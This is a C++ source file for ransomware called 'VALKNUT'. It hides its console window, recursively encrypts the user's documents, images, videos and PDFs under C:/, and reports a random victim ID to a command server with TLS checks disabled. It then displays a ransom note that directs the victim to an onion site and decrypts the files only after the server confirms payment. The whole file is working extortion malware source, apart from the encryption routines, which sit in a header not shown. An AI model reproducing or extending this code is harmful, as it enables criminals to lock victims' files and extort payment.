//
// Created by serba on 5/15/2021.
//

#include "enc_dec_engine.h"
#include <iostream>
#include <filesystem>
#include <string>
#include <fstream>
#include <winuser.h>
#include <windows.h>
#include <curl/curl.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>
using namespace std;
namespace fs = filesystem;



string decID;

char alphanum[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
int alphanumLen = sizeof(alphanum) -1;


char generate_decID_char(){
    return alphanum[rand() % alphanumLen];
}





void LISTFILES(std::string path,string opt) {

    try {
        for (const auto& entry : fs::directory_iterator(path, fs::directory_options::skip_permission_denied)) {
            if (entry.path().string().find("Windows") == std::string::npos) {
                if(opt == "626d397962574673") {
                    if (entry.path().extension().string() == ".txt" || entry.path().extension().string() == ".mp4" ||
                        entry.path().extension().string() == ".mp3" || entry.path().extension().string() == ".jpg" ||
                        entry.path().extension().string() == ".jpeg" || entry.path().extension().string() == ".doc" ||
                        entry.path().extension().string() == ".docx" || entry.path().extension().string() == ".png" ||
                        entry.path().extension().string() == ".pdf") {
                        //cout << entry.path() << '\n';
                        ENCRYPT_FUNCTION(entry.path().string());
                    }
                }else if(opt=="rwZuteXiobFR3dwL"){
                    if(entry.path().extension().string()==".valknut"){
                        //cout << entry.path() << '\n';
                        DECRYPT_FUNCTION(entry.path().string());
                    }
                }
                if (fs::is_directory(entry.path())) {
                    LISTFILES(entry.path().string(),opt);
                }
            }
        }
    }
    catch (fs::filesystem_error const& ex) {
       // cout << ex.what();


    }


}

void checkStatus(string status, HWND hWnd,string path){
    if (status == "626d397962574673") {
        //ENCRYPT_FUNCTION();
        CURL *curl;
        CURLcode res;

        curl_global_init(CURL_GLOBAL_ALL);

        string param1="192.168.0.31/valknut/process.php?decID=";
        string param2 = decID;

        string param3 = "&&method=0";
        string allParams = param1+param2+param3;
        const char* paramsChar = "";
        paramsChar = allParams.c_str();

        curl = curl_easy_init();
        if(curl){
            curl_easy_setopt(curl,CURLOPT_SSL_VERIFYHOST,0);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER,0);
            curl_easy_setopt(curl, CURLOPT_URL, paramsChar);
            curl_easy_setopt(curl, CURLOPT_POST,1);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, paramsChar);

            res = curl_easy_perform(curl);

            if(res != CURLE_OK){
                fprintf(stderr, "curl_easy_perform() failed: %s\n",
                        curl_easy_strerror(res));
            }
            curl_easy_cleanup(curl);
        }
        curl_global_cleanup();

        LISTFILES(path,status);
        ShowWindow(hWnd, SW_SHOW);

        ofstream statusOutput("event_log", ios_base::binary);
        statusOutput << "rwZuteXiobFR3dwL";
        statusOutput.close();
        ifstream newStatusFile("event_log",ios_base::binary);
        string newStatus;
        newStatusFile >> newStatus;
        checkStatus(newStatus,hWnd,path);

    } else if (status == "rwZuteXiobFR3dwL") {
        system("CLS");

        cout << "                     VALKNUT                     " << endl << endl;
        cout << " Oops! Your files have been encrypted by VALKNUT " << endl << endl << endl;
        cout << "       Your decryption id is " << decID << endl << endl <<endl;
        cout << "In order to recover them visit https://valknut.onion" << endl << endl << endl << endl;
        cout << "       Enter 1 in order to check your payment       " << endl;
        int x;
        cin >> x;

        CURL *curl;
        CURLcode res;

        curl_global_init(CURL_GLOBAL_ALL);
        string param1= "192.168.0.31/valknut/process.php?decID=";
        string param2 = decID;
        string param3 = "&&method=2";
        string allParams = param1+param2+param3;
        const char* paramsChar = "";
        paramsChar = allParams.c_str();

        curl = curl_easy_init();

        bool verified = false;
        if(curl){
            curl_easy_setopt(curl,CURLOPT_SSL_VERIFYHOST,0);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER,0);
            curl_easy_setopt(curl, CURLOPT_URL, paramsChar);
            curl_easy_setopt(curl, CURLOPT_POST,1);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, paramsChar);



            res = curl_easy_perform(curl);
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            if(http_code==300){
                verified = false;
            }else if(http_code==301){
                verified = true;
            }
        }
        curl_easy_cleanup(curl);
        curl_global_cleanup();




        if (x == 1 && verified) {
            system("CLS");
            cout << endl << endl << "Payment verified!" << endl << "Decryption in progress...";
            LISTFILES(path,status);
            ofstream statusOutput("event_log", ios_base::binary);
            statusOutput << "JTzTThybo0437wLm";
            statusOutput.close();
            ifstream newStatusFile("event_log",ios_base::binary);
            string newStatus;
            newStatusFile >> newStatus;
            checkStatus(newStatus,hWnd,path);
        }else{
            checkStatus(status,hWnd,path);
        }
    } else if (status == "JTzTThybo0437wLm") {
        system ("CLS");
        cout << "                     VALKNUT                     " << endl << endl;
        cout << "   Your files have been successfully decrypted   " << endl << endl << endl;
        int x;
        cin >> x;
    }
}





int main() {
    HWND hWnd = GetConsoleWindow();

    bool notDone = true;


    ofstream initialStatus("event_log",ios_base::binary);
    initialStatus << "626d397962574673";
    initialStatus.close();


    ShowWindow( hWnd, SW_HIDE );
    std::string status;
    ifstream statusFile("event_log", ios_base::binary);
    statusFile >> status;


    ifstream decID_INPUT("defender",ios_base::binary);
    if(decID_INPUT.peek() == std::ifstream::traits_type::eof()){
        srand(time(0));
        for(int i=0;i<30;i++){
            decID += generate_decID_char();
        }
        decID_INPUT.close();
        ofstream decID_OUTPUT("defender",ios_base::binary);
        decID_OUTPUT << decID;
    }else{
        decID_INPUT >> decID;
    }
    



    std::string path = "C:/";

    statusFile.close();







    checkStatus(status,hWnd,path);




}